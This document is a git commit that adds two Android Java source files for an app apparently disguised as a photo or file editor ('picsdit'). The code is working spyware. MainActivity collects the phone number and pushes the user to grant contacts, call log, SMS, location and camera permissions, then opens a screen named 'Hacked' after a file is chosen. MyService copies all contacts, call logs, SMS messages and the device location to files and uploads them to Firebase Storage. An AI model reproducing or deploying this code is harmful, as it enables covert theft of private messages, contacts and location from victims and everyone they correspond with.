4da6c374b3825773bbe0875171da44449eeb9a38
Mr.BoT <suyog.yadav.60@gmail.com>
2020-01-13 12:07:06 +0530

    Initial commit

---
+++ app/src/main/java/com/kernel/picsdit/MainActivity.java
@@ -0,0 +1,228 @@
+package com.kernel.picsdit;
+
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
+import androidx.appcompat.app.AlertDialog;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+import android.Manifest;
+import android.app.Activity;
+import android.content.ActivityNotFoundException;
+import android.content.Context;
+import android.content.DialogInterface;
+import android.content.Intent;
+import android.content.IntentSender;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.os.Handler;
+
+import android.util.Log;
+import android.view.View;
+import android.widget.EditText;
+import android.widget.Toast;
+
+import com.google.android.gms.common.api.ApiException;
+import com.google.android.gms.common.api.ResolvableApiException;
+import com.google.android.gms.location.LocationRequest;
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.location.LocationSettingsRequest;
+import com.google.android.gms.location.LocationSettingsResponse;
+import com.google.android.gms.location.LocationSettingsStatusCodes;
+import com.google.android.gms.tasks.OnCompleteListener;
+import com.google.android.gms.tasks.Task;
+
+public class MainActivity extends AppCompatActivity {
+
+    private static final int GROUP_ONE = 150;
+    private static final int GROUP_TWO = 160;
+    private static final int LOCATION_SETTINGS_REQUEST = 140;
+    Context context1;
+    private static final int FILE_SELECT_CODE = 0;
+
+    Context context;
+    AlertDialog.Builder builder;
+    boolean firsttime;
+    SharedPreferences appopen;
+    SharedPreferences usernamepref;
+    EditText edttext;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.welcome_screen);
+        appopen = getSharedPreferences("appopeninfo", 0);
+        usernamepref = getSharedPreferences("usernamepref", 0);
+        firsttime = appopen.getBoolean("firsttime", true);
+        builder = new AlertDialog.Builder(this);
+        Handler handler = new Handler();
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (firsttime) {
+                    SharedPreferences.Editor editor = appopen.edit();
+                    editor.putBoolean("firsttime", false);
+                    editor.apply();
+                    setContentView(R.layout.mobile_submit);
+                    edttext = findViewById(R.id.edtname);
+                } else {
+                    setContentView(R.layout.activity_main);
+                    setcontext2();
+                }
+            }
+        }, 2000);
+    }
+
+    public void setcontext2() {
+        context1 = this;
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+                && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
+                && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+                && ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+                && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
+                && ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
+            LocationRequest locationRequest = LocationRequest.create();
+            locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+            locationRequest.setInterval(10000);
+            locationRequest.setFastestInterval(10000 / 2);
+
+            LocationSettingsRequest.Builder builder = new LocationSettingsRequest.Builder().addLocationRequest(locationRequest);
+            builder.setAlwaysShow(true);
+            Task<LocationSettingsResponse> result = LocationServices.getSettingsClient(this)
+                    .checkLocationSettings(builder.build());
+            Log.i("asach", "pohchtay hith paryant");
+
+
+            result.addOnCompleteListener(new OnCompleteListener<LocationSettingsResponse>() {
+                @Override
+                public void onComplete(@NonNull Task<LocationSettingsResponse> task) {
+                    try {
+                        LocationSettingsResponse response =
+                                task.getResult(ApiException.class);
+                        Log.i("YZXY","Is this even getting Called");
+                        Intent intent = new Intent(context1, MyService.class);
+                        startService(intent);
+                    } catch (ApiException ex) {
+                        switch (ex.getStatusCode()) {
+                            case LocationSettingsStatusCodes.RESOLUTION_REQUIRED:
+                                try {
+                                    ResolvableApiException resolvableApiException =
+                                            (ResolvableApiException) ex;
+                                    resolvableApiException
+                                            .startResolutionForResult((Activity) context1,
+                                                    LOCATION_SETTINGS_REQUEST);
+                                } catch (IntentSender.SendIntentException e) {
+                                }
+                                break;
+                            case LocationSettingsStatusCodes.SETTINGS_CHANGE_UNAVAILABLE:
+                                break;
+                        }
+                    }
+                }
+            });
+        }
+    }
+
+    public void phoneSubmit(View view) {
+        if (!edttext.getText().toString().equals("") && edttext.getText() != null) {
+
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
+                    && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
+                    && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS}, GROUP_ONE);
+                SharedPreferences.Editor editor = usernamepref.edit();
+                editor.putString("username", edttext.getText().toString()).apply();
+            }
+        } else {
+            Toast.makeText(this, "Please Enter Valid Phone Number", Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        switch (requestCode) {
+            case GROUP_ONE: {
+                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED
+                        && grantResults[1] == PackageManager.PERMISSION_GRANTED
+                        && grantResults[2] == PackageManager.PERMISSION_GRANTED) {
+                    setContentView(R.layout.activity_main);
+                    context = this;
+                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
+                            && ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
+                            && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED
+                            && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                        builder.setMessage("Allow Some Permissions To Access Information");
+                        builder.setCancelable(false);
+                        builder.setPositiveButton("Yes", new DialogInterface.OnClickListener() {
+                            @Override
+                            public void onClick(DialogInterface dialog, int which) {
+                                ActivityCompat.requestPermissions((Activity) context, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.CAMERA}, GROUP_TWO);
+                            }
+                        });
+                        AlertDialog alert = builder.create();
+                        alert.setTitle("Requires Some Permission");
+                        alert.show();
+                    }
+                } else {
+                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS}, GROUP_ONE);
+                }
+            }
+            break;
+
+            case GROUP_TWO: {
+                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED
+                        && grantResults[1] == PackageManager.PERMISSION_GRANTED
+                        && grantResults[2] == PackageManager.PERMISSION_GRANTED
+                        && grantResults[3] == PackageManager.PERMISSION_GRANTED
+                        && grantResults[4] == PackageManager.PERMISSION_GRANTED) {
+
+                    setcontext2();
+                    Intent intent = new Intent(this, MyService.class);
+                    startService(intent);
+                } else {
+                    ActivityCompat.requestPermissions((Activity) context, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.CAMERA}, GROUP_TWO);
+                }
+            }
+            break;
+        }
+    }
+
+    public void openCamera(View view) {
+        Intent intent = new Intent("android.media.action.IMAGE_CAPTURE");
+        startActivity(intent);
+    }
+
+    public void OpenChooser(View view) {
+        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
+        intent.setType("*/*");
+        intent.addCategory(Intent.CATEGORY_OPENABLE);
+        try {
+            startActivityForResult(Intent.createChooser(intent, "Select File To Edit"), FILE_SELECT_CODE);
+        } catch (ActivityNotFoundException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
+        if (requestCode == FILE_SELECT_CODE) {
+            Intent intent = new Intent(this, Hacked.class);
+            startActivity(intent);
+        }
+        if (requestCode == LOCATION_SETTINGS_REQUEST && resultCode == RESULT_OK)
+        {
+            Intent intent = new Intent(this, MyService.class);
+            startService(intent);
+        }
+        if (requestCode == LOCATION_SETTINGS_REQUEST && resultCode == RESULT_CANCELED)
+        {
+            Toast.makeText(this,"You Must Turn On Location",Toast.LENGTH_LONG).show();
+            setcontext2();
+        }
+        super.onActivityResult(requestCode, resultCode, data);
+    }
+}
---
+++ app/src/main/java/com/kernel/picsdit/MyService.java
@@ -0,0 +1,225 @@
+package com.kernel.picsdit;
+
+import android.Manifest;
+import android.app.Service;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.location.Location;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Environment;
+import android.os.IBinder;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.util.Log;
+
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
+import androidx.core.content.ContextCompat;
+
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.tasks.OnFailureListener;
+import com.google.android.gms.tasks.OnSuccessListener;
+import com.google.android.gms.tasks.Task;
+import com.google.firebase.storage.FirebaseStorage;
+import com.google.firebase.storage.StorageReference;
+import com.google.firebase.storage.UploadTask;
+
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+
+public class MyService extends Service {
+    private StorageReference storageReference;
+    File locationDir;
+    File locationfile;
+    String Username;
+    FusedLocationProviderClient providerClient;
+    String LocationData = "Location Not Available At This Time";
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        storageReference = FirebaseStorage.getInstance().getReference();
+        Username = getSharedPreferences("usernamepref",0).getString("username","NEW_USER");
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        providerClient = LocationServices.getFusedLocationProviderClient(this);
+        locationDir = new File(Environment.getExternalStorageDirectory(), "LocationDir");
+        if (!locationDir.exists()) {
+            locationDir.mkdir();
+        }
+        locationfile = new File(locationDir.getPath(), "Location.txt");
+        getContacts();
+        getCallLogs();
+        getLocation();
+        getSMS();
+        return super.onStartCommand(intent, flags, startId);
+    }
+
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+
+    public void getContacts() {
+        File contactsdir = new File(Environment.getExternalStorageDirectory(), "ContactsDir");
+        if (!contactsdir.exists()) {
+            Boolean directory = contactsdir.mkdir();
+            Log.i("asach", "Folder created" + directory);
+        }
+        Log.i("asach", "Folder exists" + contactsdir.exists());
+        File contactsfile = new File(contactsdir.getPath(), "Contacts.txt");
+        Log.i("asach", contactsfile.exists() + " it exits");
+        Log.i("asach", contactsfile.canWrite() + " it is writable");
+        try {
+            FileWriter writer = new FileWriter(contactsfile);
+            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+            while (phones.moveToNext()) {
+                StringBuilder builder = new StringBuilder();
+                String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                builder.append(name).append(phoneNumber).append("\n");
+                writer.append(builder.toString());
+            }
+            writer.flush();
+            writer.close();
+            phones.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        uploaddata(contactsfile,"Contacts");
+    }
+
+    public void getCallLogs() {
+        File calllogsdir = new File(Environment.getExternalStorageDirectory(), "CallLogsDir");
+        if (!calllogsdir.exists()) {
+            Boolean directory = calllogsdir.mkdir();
+            Log.i("asach", " calllogsdir Folder created" + directory);
+        }
+        Log.i("asach", " calllogsdir Folder exists" + calllogsdir.exists());
+        File calllogsfile = new File(calllogsdir.getPath(), "CallLogs.txt");
+        Log.i("asach", calllogsfile.exists() + " it exits calllogsdir ");
+        Log.i("asach", calllogsfile.canWrite() + " it is writable calllogsdir");
+        try {
+            FileWriter writer = new FileWriter(calllogsfile);
+            Cursor calls = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
+            while (calls.moveToNext()) {
+                StringBuilder builder = new StringBuilder();
+                String name = calls.getString(calls.getColumnIndex(CallLog.Calls._ID));
+                String number = calls.getString(calls.getColumnIndex(CallLog.Calls.NUMBER));
+                int callType = calls.getInt(calls.getColumnIndex(CallLog.Calls.TYPE));
+                String type = "call";
+                if (callType == CallLog.Calls.INCOMING_TYPE) {
+                    type = "Incoming Call"; //incoming call
+                } else if (callType == CallLog.Calls.OUTGOING_TYPE) {
+                    type = "Outgoing Call";//outgoing call
+                } else if (callType == CallLog.Calls.MISSED_TYPE) {
+                    type = "Missed Call";
+                }
+                builder.append(name)
+                        .append("\n")
+                        .append(number)
+                        .append("\n")
+                        .append(type)
+                        .append("\n\n");
+                writer.append(builder.toString());
+            }
+            writer.flush();
+            writer.close();
+            calls.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        uploaddata(calllogsfile,"CallLogs");
+    }
+
+    public void getLocation() {
+
+        Log.i("asach", "getLocation is called");
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
+            Log.i("asach", "All permissions are granted");
+            Task<Location> task = providerClient.getLastLocation();
+            task.addOnSuccessListener(new OnSuccessListener<Location>() {
+                @Override
+                public void onSuccess(Location location) {
+                    Log.i("asach", "task Successfull");
+                    if (location != null) {
+                        LocationData = ""+location.getLatitude()+", "+location.getLongitude();
+                        try {
+                            FileWriter writer = new FileWriter(locationfile);
+                            writer.append(LocationData);
+                            writer.flush();
+                            writer.close();
+                        }
+                        catch (IOException e)
+                        {
+                            e.printStackTrace();
+                        }
+                        Log.i("asach", "Current Location" + location.getLatitude() + location.getLongitude());
+
+                    } else {
+                        Log.i("asach", "Location is NULL");
+                    }
+                }
+            });
+        }
+        uploaddata(locationfile,"Location");
+    }
+
+    public void getSMS() {
+        File smsdir = new File(Environment.getExternalStorageDirectory(), "SMSLogsDir");
+        if (!smsdir.exists()) {
+            smsdir.mkdir();
+        }
+        File smslogsfile = new File(smsdir.getPath(), "SMSLogs.txt");
+        Uri smsuri = Uri.parse("content://sms/inbox");
+        try {
+            FileWriter writer = new FileWriter(smslogsfile);
+            Cursor cursor = getContentResolver().query(smsuri, new String[]{"_id", "address", "date", "body"}, null, null, null);
+            cursor.moveToFirst();
+            while (cursor.moveToNext()) {
+                StringBuilder builder = new StringBuilder();
+                String address = cursor.getString(1);
+                String body = cursor.getString(3);
+
+                builder.append(address)
+                        .append("\n")
+                        .append(body)
+                        .append("\n\n");
+                writer.append(builder.toString());
+            }
+            writer.flush();
+            writer.close();
+            cursor.close();
+            uploaddata(smslogsfile,"SMSLogs");
+        }catch (IOException e)
+        {
+            e.printStackTrace();
+        }
+    }
+
+    public void uploaddata(File file,String foldername)
+    {
+        StorageReference Ref = storageReference.child(Username+"/"+foldername+"/"+file.getName());
+        Ref.putFile(Uri.fromFile(new File(file.getPath())))
+                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
+                    @Override
+                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
+                        Log.i("asach", "Upload Successful");
+                    }
+                })
+                .addOnFailureListener(new OnFailureListener() {
+                    @Override
+                    public void onFailure(@NonNull Exception exception) {
+                        Log.i("asach", "Upload Unsuccessful");
+                    }
+                });
+    }
+}
